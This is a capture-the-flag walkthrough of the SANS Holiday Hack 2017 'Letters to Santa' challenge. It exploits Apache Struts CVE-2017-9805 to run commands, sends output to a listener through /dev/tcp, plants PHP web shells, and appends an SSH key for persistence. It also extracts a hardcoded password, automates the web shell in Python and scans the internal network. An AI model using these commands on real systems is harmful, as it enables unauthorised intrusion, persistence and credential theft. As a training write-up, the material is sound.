* Question
   :PROPERTIES:
   :CUSTOM_ID: q2_question
   :END:

Investigate the Letters to Santa application at
https://l2s.northpolechristmastown.com. What is the topic of The
Great Book page available in the web root of the server? What is
Alabaster Snowball's password?

/For hints associated with this challenge, Sparkle Redberry in the Winconceivable: The Cliffs of Winsanity Level can provide some tips./

* Background Information
   :PROPERTIES:
   :CUSTOM_ID: q2_background-information
   :END:

We know that there is an application on =https://l2s.northpolechristmastown.com= that we need to investigate.
This webpage is publically accessible from the Internet and not appear to require any special measures to
access it. We do not know Alabaster password or username at the start of this challenge nor what type of
web service is running on the host.

The following hints were provided by Sparkle Redberry from completing the level
[[https://2017.holidayhackchallenge.com/game/3e813a9c-cb34-492e-a317-0dd99c8ca2e7][Winconceivable: The Cliffs of Winsanity]]:
  1. We're excited to debut the new Letters to Santa site this year. Alabaster worked hard on that project for over a year. I got to work with the development version of the site early on in the project lifecycle.
  2. Near the end of the development we had to rush a few things to get the new site moved to production. Some development content on the letter page should probably have been removed, but ended up marked as hidden to avoid added change control paperwork.
  3. Alabaster's primary backend experience is with Apache Struts. I love Apache and have a local instance set up on my home computer with a web shell. Web shells are great as a backdoor for me to access my system remotely. I just choose a really long complex file name so that no one else knows how to access it.
  4. A simple web shell is to create a PHP file in the web root with ~<?php echo "<pre>" . shell_exec($_GET['e']) . "</pre>"; ?>~. Then, I visit the URL with my commands. For example, =http://server/complexFileName.php?e=ls=.
  5. There are lots of different web shell tools available. [[https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985][You can get a simple PHP web shell that is easy to use here]].
  6. That business with Equal-Facts Inc was really unfortunate. I understand there are a lot of different exploits available for those vulnerable systems. Fortunately, Alabaster said he tested for CVE-2017-5638 and it was NOT vulnerable. Hope he checked the others too.
  7. Apache Struts uses XML. I always had problems making proper XML formatting because of special characters. I either had to encode my data or escape the characters properly so the XML wouldn't break. I actually just checked and there are lots of different exploits out there for vulnerable systems. [[https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code][Here is a useful article]].
  8. Pro developer tip: Sometimes developers hard code credentials into their development files. Never do this, or at least make sure you take them out before publishing them or putting them into production. You also should avoid reusing credentials for different services, even on the same system.

The following SANS Pentest Blog posts were also very helpful for this challenge:
- [[https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code][Why You Need the Skills to Tinker with Publicly Released Exploit Code]]
  
  Code: [[https://github.com/chrisjd20/cve-2017-9805.py]]
- [[https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee Restricted][A Spot of Tee]]
  bash shell, and bypassing the I/O restriction with tee

* Goal
   :PROPERTIES:
   :CUSTOM_ID: q2_goal
   :END:

There are two goals for this challenge. The first is to determine the topic of
the Great Book Page that is sitting on the web root of this server. The second
is to determine what Alabaster's password is.

* Approach
   :PROPERTIES:
   :CUSTOM_ID: q2_approach
   :END:

According to the second hint there might be development code left in the production code.
If we look at the source of =l2s= the following code pops out.

#+BEGIN_SRC html
<!-- Development version -->
<a href="http://dev.northpolechristmastown.com" style="display: none;">Access Development Version</a>
#+END_SRC

Let's do some recon on the hosts:

#+BEGIN_SRC
$ nmap -sC l2s.northpolechristmastown.com

Starting Nmap 7.40 ( https://nmap.org ) at 2018-01-03 15:36 CST
Nmap scan report for l2s.northpolechristmastown.com (35.185.84.51)
Host is up (0.027s latency).
rDNS record for 35.185.84.51: 51.84.185.35.bc.googleusercontent.com
Not shown: 996 filtered ports
PORT     STATE  SERVICE
22/tcp   open   ssh
| ssh-hostkey:
|   2048 81:aa:b0:de:e0:4a:b5:23:7e:e8:cd:14:f3:fa:e2:f3 (RSA)
|_  256 dc:0b:52:ab:43:87:59:7b:04:88:2d:5c:db:92:4f:ba (ECDSA)
80/tcp   open   http
|_http-title: Did not follow redirect to https://l2s.northpolechristmastown.com/
443/tcp  open   https
|_http-title: Toys List
| ssl-cert: Subject: commonName=dev.northpolechristmastown.com
| Subject Alternative Name: DNS:dev.northpolechristmastown.com, DNS:l2s.northpolechristmastown.com
| Not valid before: 2017-11-29T12:54:54
|_Not valid after:  2018-02-27T12:54:54
|_ssl-date: TLS randomness does not represent time
| tls-nextprotoneg:
|_  http/1.1
3389/tcp closed ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 7.04 seconds
#+END_SRC

In addition to the hidden link for dev.northpolechristmastown.com, it is also
present as an alternate name on the certificate of the host. Let's let nmap's
scripts scan that as well.

#+BEGIN_SRC
$ nmap -sC dev.northpolechristmastown.com

Starting Nmap 7.40 ( https://nmap.org ) at 2018-01-03 15:36 CST
Nmap scan report for dev.northpolechristmastown.com (35.185.84.51)
Host is up (0.028s latency).
rDNS record for 35.185.84.51: 51.84.185.35.bc.googleusercontent.com
Not shown: 996 filtered ports
PORT     STATE  SERVICE
22/tcp   open   ssh
| ssh-hostkey:
|   2048 81:aa:b0:de:e0:4a:b5:23:7e:e8:cd:14:f3:fa:e2:f3 (RSA)
|_  256 dc:0b:52:ab:43:87:59:7b:04:88:2d:5c:db:92:4f:ba (ECDSA)
80/tcp   open   http
|_http-title: Did not follow redirect to https://dev.northpolechristmastown.com/
443/tcp  open   https
| http-title: Toys List
|_Requested resource was /orders.xhtml
| ssl-cert: Subject: commonName=dev.northpolechristmastown.com
| Subject Alternative Name: DNS:dev.northpolechristmastown.com, DNS:l2s.northpolechristmastown.com
| Not valid before: 2017-11-29T12:54:54
|_Not valid after:  2018-02-27T12:54:54
|_ssl-date: TLS randomness does not represent time
| tls-nextprotoneg:
|_  http/1.1
3389/tcp closed ms-wbt-server
#+END_SRC

We can see that dev and l2s are one and the same, which is important, since dev was not explicitly called out as being in scope. Visiting the dev page has a footer
that simply states =Powered By: Apache Struts=. Let's use this to our advantage.
Let's use the tool provided through the SANS Pentest blog,
[[https://github.com/chrisjd20/cve-2017-9805.py][cve-2017-9805.py]]. The dev page
we land on is [[https://dev.northpolechristmastown.com/orders.xhtml]] so we'll use
that to start from.

Let's check out the help:

#+BEGIN_SRC
$ ./cve-2017-9805.py
usage: cve-2017-9805.py [-h] [-u URL] -c COMMAND

optional arguments:
  -h, --help  show this help message and exit
  -u URL      url of target vulnerable apache struts server. Ex-
              http://somevulnstrutsserver.com/orders.xhtml
  -c COMMAND  command to execute against the target. Ex - /usr/bin/whoami
#+END_SRC

The example URL is =http://somevulnstrutsserver.com/orders.xhtml=. How fortituous!

#+BEGIN_SRC
$ python cve-2017-9805.py -u https://dev.northpolechristmastown.com/orders.xhtml -c 'ls'
[+] Encoding Command
[+] Building XML object
[+] Placing command in XML object
[+] Converting Back to String
[+] Making Post Request with our payload
[+] Payload executed
#+END_SRC

Looks like we need to modify the program to let us see what it's
doing by uncommenting the following line:

#+BEGIN_SRC python
print request.text
#+END_SRC

Rerunning our command now results in a lengthy Apache Tomcat error
with no apparent output from our =ls= command. We're dealing with a
blind injection so we'll need to figure out a different way to get the
output of the command. One trick we can pull is redirecting output to
a special pseudo device, ~/dev/tcp/$host/$port~. We'll need to
set up a listener on our end first:

#+BEGIN_SRC
holiday@hack:~$ nc -l -p 8888
#+END_SRC

Now we run the exploit again:

#+BEGIN_SRC
./cve-2017-9805.py -u https://dev.northpolechristmastown.com/orders.xhtml -c "ls > /dev/tcp/1.2.3.4/8888"
#+END_SRC

The result on our end is:
#+BEGIN_SRC
holiday@hack:~$ nc -l -p 8888
bin
boot
dev
etc
home
...
vmlinuz
vmlinuz.old
#+END_SRC

It looks like we've been dropped into the root directory. Let's look for
where the web root is. Normally, the default is /var/www/html on most
linux+apache based hosts. We'll try again with the command =ls -al /var/www/html=.

#+BEGIN_SRC
total 1772
drwxrwxrwt 6 www-data           www-data              4096 Jan  6 03:00 .
drwxr-xr-x 3 root               root                  4096 Oct 12 14:35 ..
drwxr-xr-x 2 root               www-data              4096 Oct 12 19:03 css
drwxr-xr-x 3 root               www-data              4096 Oct 12 19:40 fonts
-r--r--r-- 1 root               www-data           1764298 Dec  4 20:25 GreatBookPage2.pdf
drwxr-xr-x 2 root               www-data              4096 Oct 12 19:14 imgs
-rw-r--r-- 1 root               www-data             14501 Nov 24 20:53 index.html
drwxr-xr-x 2 root               www-data              4096 Oct 12 19:11 js
-rwx------ 1 www-data           www-data               231 Oct 12 21:25 process.php
#+END_SRC

Oh look. There's [[https://l2s.northpolechristmastown.com/GreatBookPage2.pdf][GreatBookPage2.pdf]]. We can download it and find the answer to the first question.

Let's assume for a minute that we didn't know where the web root
was. Since page 1 of our Great Book was a PDF, it's a pretty safe bet
that page 2 is also a PDF. It takes about half of a second to search the system for all PDFs using =find=:

#+BEGIN_SRC
$ find / -name *.pdf
/var/www/html/GreatBookPage2.pdf
#+END_SRC

*** Command Execution

 It looks like we found our web root. Let's try out the
 web shell they suggest in the hints from Josh Wright
 [[https://gist.githubusercontent.com/joswr1ght/22f40787de19d80d110b37fb79ac3985/raw/be4b2c021b284f21418f55b9d4496cdd3b3c86d8/easy-simple-php-webshell.php][easy-simple-php-webshell.php]].
 We'll output it to a random file in the web root then
 we can try to use it to execute commands using a browser.

 #+BEGIN_SRC
 ./cve-2017-9805.py -c "wget -O /var/www/html/4beadb1e-5ddb-4636-98a4-c2dac0f79ab0.php
    https://gist.githubusercontent.com/joswr1ght/22f40787de19d80d110b37fb79ac3985/raw/be4b2c021b284f21418f55b9d4496cdd3b3c86d8/easy-simple-php-webshell.php"
    -u https://dev.northpolechristmastown.com/orders.xhtml
 #+END_SRC

 Now we can access
 [[https://l2s.northpolechristmastown.com/4beadb1e-5ddb-4636-98a4-c2dac0f79ab0.php]]
 and look around. If we do an =ls= in this webshell, it just returns
 the local directory, =/var/www/html=. Nothing in here suggests that we
 have the webroot for the dev server,
 [[https://dev.northpolechristmastown.com]].

 Let's run =find= to see if we can find the password in our webshell.

 #+BEGIN_SRC sh
 find / -xdev -type f -user alabaster_snowball 2>/dev/null | xargs grep password
 #+END_SRC

 Within the page full of results we see this:

 #+BEGIN_SRC
 /opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class: final String password = "stream_unhappy_buy_loss";
 #+END_SRC

 A closer look at =OrderMySql.class= using =cat /opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class= we find:

 #+BEGIN_SRC java
 final String username = "alabaster_snowball";
 final String password = "stream_unhappy_buy_loss";
 #+END_SRC

* Solution
   :PROPERTIES:
   :CUSTOM_ID: q2_solution
   :END:

*** What is the topic of The Great Book page available in the web root of the server?

Leveraging the Apache Struts vulnerability, we can run =ls= on the
common web root of =/var/www/html=, and get the filename of the page,
then download it via the web server. Opening it up, we see that the
topic is:

#+BEGIN_QUOTE
On the Topic of Flying Animals
#+END_QUOTE

*** What is Alabaster Snowball’s password?

The trick here is just finding the right file, and the password is in
cleartext in that file. We used =find= to =grep= all the files for
"password".

#+BEGIN_QUOTE
=stream_unhappy_buy_loss=
#+END_QUOTE

* Alternatives
   :PROPERTIES:
   :CUSTOM_ID: q2_alternatives
   :END:

*** Add an authorized_key

One thing you can do if you don't have the password yet is actually
add an SSH key to Alabaster's authorized keys file. This is
problematic since you need to know that the username is actually
=alabaster_snowball= first. Assuming you do, you can run the following
command to add your key to the file.

The command we want to run is the following, taking care not to clobber any existing authorized keys:

#+BEGIN_SRC sh
cd /home/alabaster_snowball
# Make the .ssh directory, if it doesn't exist
mkdir .ssh
# ssh is very picky about permissions, so lock this down:
chmod 700 .ssh
cd .ssh

# Create the authorized_keys file, if it doesn't exist
touch authorized_keys
# ...and lock it down
chmod 600 authorized_keys

# Append our key
echo ssh-rsa VGhpcyBpcyBub3QgcmVhbGx5IGFuIFJTQSBrZXksIGJ1dCBoZXksIHdobyByZWFsbHkgbG9va3MgYXQgYmFzZTY0IGFueXdheQo= holiday@hack | 
  tee -a /home/alabaster_snowball/.ssh/authorized_keys
#+END_SRC

For running this via the Struts exploit, we want this all as a
one-liner. Let's break this up into two parts: first, we'll create the
necessary directory and file, and ensure the permissions are correct,
then we'll add our key:

#+BEGIN_SRC sh
./cve_2017_9805.py -u https://dev.northpolechristmastown.com/orders.xhtml -c 
  'cd /home/alabaster_snowball; mkdir .ssh; chmod 700 .ssh; cd .ssh; touch authorized_keys; chmod 600 authorized_keys'
./cve_2017_9805.py -u https://dev.northpolechristmastown.com/orders.xhtml -c 
  'echo ssh-rsa VGhpcyBpcyBub3QgcmVhbGx5IGFuIFJTQSBrZXksIGJ1dCBoZXksIHdobyByZWFsbHkgbG9va3MgYXQgYmFzZTY0IGFueXdheQo= holiday@hack | tee -a /home/alabaster_snowball/.ssh/authorized_keys'
#+END_SRC

Then you can SSH in using your private key identity file.

#+BEGIN_SRC
holiday@hack:~$ ssh -i /home/holiday/.ssh/sans_2017 alabaster_snowball@l2s.northpolechristmastown.com
alabaster_snowball@l2s:/tmp/asnow.xq1pCkwT7LUy3iLl0AaBCc7D$ grep -A1 -R / -e alabaster_snowball
/opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class: final String username = "alabaster_snowball";
/opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class- final String password = "stream_unhappy_buy_loss";
#+END_SRC

Once in you are in a restricted shell but you can try to =grep= for
Alabaster's password but a regular =grep= against the entire system will
take about 1 minute then you have to parse through the results.

*** Automate the webshell

We can automate dropping a webshell and creating a mini shell to query
it. Assuming we have [[https://github.com/chrisjd20/cve-2017-9805.py]] in
the same directory we can create a script to automate exploitation and
give us a prompt to execute commands.

#+BEGIN_SRC python
#!/usr/bin/env python
from __future__ import print_function

import base64
import requests
import sys

from cve_2017_9805 import main as struts_exploit

VULNERABLE_ENDPOINT = "https://dev.northpolechristmastown.com/orders.xhtml"
BASE_URL = "https://l2s.northpolechristmastown.com/"
WEBSHELL = "4beadb1e-5ddb-4636-98a4-c2dac0f79ab3.php"
WEBSHELL_PAYLOAD = b'<?php system($_GET[cmd]); ?>\n'
WEBSHELL_PAYLOAD_ENCODED = base64.encodestring(WEBSHELL_PAYLOAD).strip()

## Emulate this command:
## /cve-2017-9805.py -c 'echo PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pgo= | 
##    base64 -d > /var/www/html/4beadb1e-5ddb-4636-98a4-c2dac0f79ab0.php' -u https://dev.northpolechristmastown.com/orders.xhtml
EXPLOIT_COMMAND = "echo {} | base64 -d > /var/www/html/{}".format(WEBSHELL_PAYLOAD_ENCODED, WEBSHELL)

def run_command(command):
    url = BASE_URL + WEBSHELL
    request = requests.get(url, params={"cmd":command})
    if request.status_code == 404:
        return None
    return request.text

#Main function
def setup():
    # See if we can run the id command, and if so, we are good to go...
    out = run_command('id')
    if out and 'uid=' in out:
        return True
    sys.stderr.write("The webshell did not exist, re-exploiting.....\n")
    struts_exploit(VULNERABLE_ENDPOINT, EXPLOIT_COMMAND)
    out = run_command('id')
    if out and 'uid=' in out:
        return True
    sys.stderr.write("The struts exploit/webshell failed :-(\n")
    sys.exit(1)

def interactive():
    setup()
    while True:
        try:
            cmd = raw_input("www-data@l2s:$ ")
        except EOFError:
            print()
            return
        print(run_command(cmd))

def one_shot(command):
    setup()
    print(run_command(command))

if __name__ == "__main__":
    if sys.argv[1:]:
        one_shot(' '.join(sys.argv[1:]))
    else:
        interactive()
#+END_SRC

First we need to either rename =cve-2017-9805.py= to
=cve_2017_9805.py= or create a symlink so it can be properly imported
into our script. Then we can easily execute commands on l2s.

#+BEGIN_SRC
holiday@hack:~$ ./l2s.py id
The webshell did not exist, re-exploiting.....
[+] Encoding Command
[+] Building XML object
[+] Placing command in XML object
[+] Converting Back to String
[+] Making Post Request with our payload
[+] Payload executed
uid=33(www-data) gid=33(www-data) groups=33(www-data)

holiday@hack:~$ ./l2s.py uname -a
Linux hhc17-apache-struts1 4.9.0-5-amd64 #1 SMP Debian 4.9.65-3+deb9u2 (2018-01-04) x86_64 GNU/Linux

holiday@hack:~$ ./l2s.py
www-data@l2s:$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

www-data@l2s:$ uname -a
Linux hhc17-apache-struts1 4.9.0-5-amd64 #1 SMP Debian 4.9.65-3+deb9u2 (2018-01-04) x86_64 GNU/Linux
#+END_SRC

*** Search even faster with ripgrep

=ripgrep= is a super fast =grep= replacement written in rust. It does a
better job at filtering binary files, so we can run this command that
finishes in about a second.

The following steps create a folder for =ripgrep= and executes the
search.

#+BEGIN_SRC sh
www-data@l2s:$ mkdir /tmp/.rg
www-data@l2s:$ wget -q -O - https://github.com/BurntSushi/ripgrep/releases/download/0.7.1/ripgrep-0.7.1-x86_64-unknown-linux-musl.tar.gz | 
  tar xzf - -C /tmp/.rg/
www-data@l2s:$ find / -type f -xdev -user alabaster_snowball 2>/dev/null | 
  xargs /tmp/.rg/ripgrep-0.7.1-x86_64-unknown-linux-musl/rg alabaster -A 1
/opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class: final String username = "alabaster_snowball";
/opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class- final String password = "stream_unhappy_buy_loss";
#+END_SRC

* Common Pitfalls
   :PROPERTIES:
   :CUSTOM_ID: q2_common-pitfalls
   :END:

A common pitfall is the blind injection aspect of the Apache Struts exploit. There were a couple of ways around this:

  * Using the ~/dev/tcp~ trick like we did,
  * Redirect the output to =/var/www/html/$filename=, and then accessing that via the web interface,
  * Piping the output to =netcat=.

Finding the password was also tricky. Luckily, there weren't many
files on this system, so we could just =grep= everything, but another
option would've been to look for files that had been modified around
the time the system was installed.

Trying to compromise the l2s app itself was a dead end.  Once we have command
execution we can see that the process.php script is simply:

#+BEGIN_SRC php
<?php
if ($_POST["first_name"] && $_POST["age"] && $_POST["state"] && $_POST["city"] && $_POST["toy"] && $_POST["message"] && $_POST["sex"]) {
	echo "Letter has been sent to Santa!";
} else {
	echo "Error missing parameters";
}
?>
#+END_SRC

* About the Challenge
   :PROPERTIES:
   :CUSTOM_ID: q2_about-the-challenge
   :END:

Initially the host had a couple of noticeable holes.

  * Apache server running as =alabaster_snowball= (eventually changed to =www-data= user)
  * Easy bypass of rbash by adding the '-t' flag and executing =bash= on SSH login (eventually =rbash= was forced through =/etc/ssh/sshd_config=)

The server itself housed two virtual web hosts, the Letters to Santa application which ran PHP in =nginx= and the Development site which was run by Apache Struts on a high port being redirected by =nginx=.

* Moving Foward

Now that we have a script to automate access to l2s let's run =nmap= to scan the internal network.

#+BEGIN_SRC
holiday@hack:~$ ./l2s.py "nmap -sC 10.142.0.*"

Starting Nmap 7.40 ( https://nmap.org ) at 2018-01-09 20:51 UTC
Nmap scan report for hhc17-l2s-proxy.c.holidayhack2017.internal (10.142.0.2)
Host is up (0.00018s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
| ssh-hostkey:
|   2048 81:aa:b0:de:e0:4a:b5:23:7e:e8:cd:14:f3:fa:e2:f3 (RSA)
|_  256 dc:0b:52:ab:43:87:59:7b:04:88:2d:5c:db:92:4f:ba (ECDSA)
80/tcp   open  http
|_http-title: Did not follow redirect to https://hhc17-l2s-proxy.c.holidayhack2017.internal/
443/tcp  open  https
|_http-title: Toys List
| ssl-cert: Subject: commonName=dev.northpolechristmastown.com
| Subject Alternative Name: DNS:dev.northpolechristmastown.com, DNS:l2s.northpolechristmastown.com
| Not valid before: 2017-11-29T12:54:54
|_Not valid after:  2018-02-27T12:54:54
|_ssl-date: TLS randomness does not represent time
| tls-nextprotoneg:
|_  http/1.1
2222/tcp open  EtherNetIP-1

Nmap scan report for hhc17-apache-struts1.c.holidayhack2017.internal (10.142.0.3)
Host is up (0.00017s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey:
|   2048 81:aa:b0:de:e0:4a:b5:23:7e:e8:cd:14:f3:fa:e2:f3 (RSA)
|_  256 dc:0b:52:ab:43:87:59:7b:04:88:2d:5c:db:92:4f:ba (ECDSA)
80/tcp open  http
|_http-title: Toys List

Nmap scan report for mail.northpolechristmastown.com (10.142.0.5)
Host is up (0.00018s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
| ssh-hostkey:
|   2048 a2:c4:67:fe:a2:d9:df:47:02:55:35:1a:f4:1b:b6:02 (RSA)
|_  256 9e:d4:01:d1:71:be:95:90:68:6e:ee:87:28:42:49:8e (ECDSA)
25/tcp   open  smtp
|_smtp-commands: mail.northpolechristmastown.com, PIPELINING, SIZE 10240000, ETRN, AUTH PLAIN LOGIN, AUTH=PLAIN LOGIN, ENHANCEDSTATUSCODES, 8BITMIME, DSN,
80/tcp   open  http
| http-robots.txt: 1 disallowed entry
|_/cookie.txt
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
143/tcp  open  imap
|_imap-capabilities: more AUTH=PLAIN capabilities have OK Pre-login AUTH=LOGINA0001 ENABLE listed SASL-IR IDLE post-login LITERAL+ IMAP4rev1 LOGIN-REFERRALS ID
2525/tcp open  ms-v-worlds
3000/tcp open  ppp

Nmap scan report for edb.northpolechristmastown.com (10.142.0.6)
Host is up (0.00014s latency).
Not shown: 996 closed ports
PORT     STATE    SERVICE
22/tcp   open     ssh
| ssh-hostkey:
|   2048 73:de:22:15:7b:53:13:85:a7:a5:8f:10:3a:5d:3b:3f (RSA)
|_  256 f5:d7:f3:5d:dc:7c:73:10:cc:f7:a4:c7:f0:d9:61:0c (ECDSA)
80/tcp   open     http
| http-robots.txt: 1 disallowed entry
|_/dev
| http-title: Site doesn't have a title (text/html; charset=utf-8).
|_Requested resource was http://edb.northpolechristmastown.com/index.html
389/tcp  filtered ldap
8080/tcp open     http-proxy
| http-robots.txt: 1 disallowed entry
|_/dev
|_http-title: Did not follow redirect to http://edb.northpolechristmastown.com/index.html

Nmap scan report for hhc17-emi.c.holidayhack2017.internal (10.142.0.8)
Host is up (0.00021s latency).
Not shown: 995 closed ports
PORT     STATE SERVICE
80/tcp   open  http
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
| ssl-cert: Subject: commonName=hhc17-smb-server
| Not valid before: 2017-11-06T13:46:55
|_Not valid after:  2018-05-08T13:46:55
|_ssl-date: 2018-01-09T20:51:47+00:00; 0s from scanner time.

Host script results:
|_nbstat: NetBIOS name: HHC17-SMB-SERVE, NetBIOS user: <unknown>, NetBIOS MAC: 42:01:0a:8e:00:08 (unknown)
| smb-security-mode:
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smbv2-enabled: Server supports SMBv2 protocol

Nmap scan report for hhc17-apache-struts2.c.holidayhack2017.internal (10.142.0.11)
Host is up (0.00021s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
| ssh-hostkey:
|   2048 81:aa:b0:de:e0:4a:b5:23:7e:e8:cd:14:f3:fa:e2:f3 (RSA)
|_  256 dc:0b:52:ab:43:87:59:7b:04:88:2d:5c:db:92:4f:ba (ECDSA)
80/tcp   open  http
|_http-title: Toys List
4444/tcp open  krb524

Nmap scan report for eaas.northpolechristmastown.com (10.142.0.13)
Host is up (0.00078s latency).
Not shown: 998 filtered ports
PORT     STATE SERVICE
80/tcp   open  http
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Index - North Pole Engineering Presents: EaaS!
3389/tcp open  ms-wbt-server
| ssl-cert: Subject: commonName=hhc17-elf-manufacturing
| Not valid before: 2017-11-23T20:53:55
|_Not valid after:  2018-05-25T20:53:55
|_ssl-date: 2018-01-09T20:51:47+00:00; 0s from scanner time.

Post-scan script results:
| clock-skew:
|   0s:
|     10.142.0.13 (eaas.northpolechristmastown.com)
|_    10.142.0.8 (hhc17-emi.c.holidayhack2017.internal)
| ssh-hostkey: Possible duplicate hosts
| Key 256 dc:0b:52:ab:43:87:59:7b:04:88:2d:5c:db:92:4f:ba (ECDSA) used by:
|   10.142.0.2
|   10.142.0.3
|   10.142.0.11
| Key 2048 81:aa:b0:de:e0:4a:b5:23:7e:e8:cd:14:f3:fa:e2:f3 (RSA) used by:
|   10.142.0.2
|   10.142.0.3
|_  10.142.0.11
Nmap done: 256 IP addresses (7 hosts up) scanned in 14.86 seconds
#+END_SRC
